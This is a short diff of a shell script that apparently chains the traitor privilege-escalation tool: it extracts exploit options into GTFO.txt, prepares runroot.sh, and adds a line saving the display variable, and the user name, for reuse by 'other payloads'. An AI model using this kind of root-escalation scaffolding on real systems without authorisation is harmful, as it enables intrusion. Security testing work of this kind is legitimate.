@@ -28,9 +28,11 @@ chmod +x traitor
 cat traitor_out.txt | grep -oE '\-\-exploit \w+(:)\w+' > GTFO.txt 
 chmod +x ./runroot.sh
 
+
+# store DISPLAY into file - to be reused by other payloads
+echo $DISPLAY > ./display.txt
 # echo current user into file - to be reused by other payloads
 echo $USER > ./user.txt
-
 
 
 # Use traitor in py
